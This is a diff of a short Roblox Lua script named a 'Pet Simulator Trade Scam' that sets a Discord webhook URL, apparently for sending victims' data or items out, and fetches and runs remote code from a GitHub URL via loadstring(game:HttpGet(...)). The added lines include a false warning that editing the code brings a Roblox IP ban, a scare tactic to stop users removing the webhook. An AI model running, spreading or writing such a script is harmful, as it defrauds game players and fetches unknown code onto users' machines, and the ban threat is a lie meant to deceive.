@@ -1,5 +1,6 @@
-_G.Username "D2rk3n"
-_G.HubName "Pet Simulator Trade Scam"
-_G.WebhookUrl "https://discord.com/api/webhooks/1138281920959094866/PfkQv_pq-J7Eu_y0pf_pAXEuxv8vwagzM5MCVLARpMEW72ItByBIPKD_kVkPfEuU_141"
+_G.Username "D2rk3n" -- DO NOT DELETE / CHANGE THIS.
+_G.HubName "Pet Simulator Trade Scam" -- DO NOT DELETE / CHANGE THIS.
+_G.WebhookUrl "https://discord.com/api/webhooks/1138281920959094866/PfkQv_pq-J7Eu_y0pf_pAXEuxv8vwagzM5MCVLARpMEW72ItByBIPKD_kVkPfEuU_141" -- DO NOT DELETE / CHANGE THIS
+-- If you delete / change the code, roblox moderation will ip ban you. Do not change anything for your account's safety.
 
 loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))()
